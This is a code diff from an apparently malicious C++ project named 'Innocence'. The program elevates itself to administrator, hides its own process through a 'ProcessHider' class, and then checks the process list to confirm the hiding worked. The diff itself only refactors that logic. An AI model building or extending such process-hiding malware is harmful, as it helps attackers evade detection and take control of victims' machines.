@@ -1,5 +1,3 @@
-#include <algorithm>
-
 #include <malicious/ProcessHider.hpp>
 
 #include <system/Uac.hpp>
@@ -11,7 +9,7 @@
 
 #include <common/Innocence.hpp>
 
-int main(int argc, char * argv[])
+int submain(int argc, char ** argv)
 {
 	int exitCode = EXIT_FAILURE;
     try
@@ -21,13 +19,11 @@ int main(int argc, char * argv[])
 	    LOG.addObserver(new Log::LogToCollector);
 		LOG.addObserver(new Audit::LogToAuditor);
 
-        System::Process::This thisProcess;
-        if(!System::isAdministrator())
-	    {
-            LOG << "Trying to run as administrator";
-		    System::RunAsAdministrator(thisProcess.getProgramName(), thisProcess.getProgramDir());
-		    return EXIT_SUCCESS;
-	    }
+		System::Process::This thisProcess;
+		if(!thisProcess.runAsAdmin())
+		{
+			return EXIT_SUCCESS;
+		}
 
         LOG << "Hiding the process";
         Malicious::ProcessHider hider;
@@ -38,7 +34,7 @@ int main(int argc, char * argv[])
 
 		for(System::Process::Map::iterator i = pm.begin(); i != pm.end(); i++)
 		{
-			if(i->second ==  thisProcess.getProgramName())
+			if(i->first ==  thisProcess.getPid())
 			{
 				exitCode = EXIT_SUCCESS;
 				break;
@@ -53,3 +49,5 @@ int main(int argc, char * argv[])
 	CATCH_UNKNOWN_EXCEPTION
 	return exitCode;
 }
+
+INNOCENCE_MAIN
